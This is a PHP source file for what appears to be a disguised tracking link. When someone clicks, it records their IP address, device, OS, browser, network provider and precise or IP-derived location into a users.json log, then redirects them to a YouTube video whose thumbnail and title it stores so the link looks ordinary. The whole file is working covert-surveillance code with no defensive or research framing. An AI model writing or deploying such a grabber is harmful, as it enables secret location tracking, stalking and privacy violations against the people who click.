
<?php

use function PHPSTORM_META\type;

require('UserInfo.php');

function getInfo()
{
    $date = date("Y-m-d H:i:s");
    $ip = UserInfo::get_ip();
    $device = UserInfo::get_device();
    $os = UserInfo::get_os();
    $browser = UserInfo::get_browser();
    $notes = '';

    $latitude = $_GET['lat'];
    $longtitude = $_GET['long'];
    $method = 'getcurrentposition';
    if ($ip == "::1") {
        $ip = "91.106.45.252";
    };

    $details = json_decode(file_get_contents("https://api.ipregistry.co/${ip}?key=tryout"), true);
    $provider = $details['connection']['organization'];
    if ($latitude == "error") {
        $latitude = $details['location']['latitude'];
        $longtitude = $details['location']['longitude'];
        $method = 'ipaddress';
    }
    $newarray = [
        'date' => $date, 'ip' => $ip, 'device' => $device,
        'os' => $os, 'browser' => $browser, 'latitude' => $latitude, 'longtitude' => $longtitude,
        'method' => $method, 'provider' => $provider, 'notes' => $notes
    ];

    return $newarray;
}

function getUsers()
{
    return json_decode(file_get_contents("us/users.json"), true);
}

function createUser($id)
{
    $newData = getInfo();
    $users = getUsers();
    $users[] = $newData;
    $users = json_encode($users);
    $link = "Location: https://www.youtube.com/watch?v=${id}";
    file_put_contents('us\users.json', $users);
    sleep(2);

    header($link, true, 301);
}



function getThumbnail($id)
{
    $links = json_decode(file_get_contents("li\links.json"), true);
    foreach ($links as $link) {
        if ($link['id'] == $id) {
            return $link['thumbnail'];
        }
    }
    return null;
}
function getTubeTitel($id)
{
    $links = json_decode(file_get_contents("li\links.json"), true);
    foreach ($links as $link) {
        if ($link['id'] == $id) {
            return $link['title'];
        }
    }
    return null;
}


?>